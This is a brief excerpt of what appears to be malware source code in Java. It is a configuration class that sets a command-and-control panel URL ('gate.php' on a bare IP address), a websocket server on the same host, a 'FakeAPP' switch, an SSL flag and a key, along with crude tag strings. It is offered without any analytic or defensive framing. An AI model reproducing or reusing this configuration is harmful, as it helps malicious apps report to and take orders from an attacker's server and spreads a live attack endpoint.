...
public class defines {
    ...
    public  String tag = "highasfuckanasinisatim";
    public  String str_urlAdminPanel = "http://5.42.92.4:4000/gate.php";
    public  String ws_url = "5.42.92.4:8000";
    public  Boolean FakeAPP = false;
    public  Boolean ssl = false;
    public  String key = "porno";
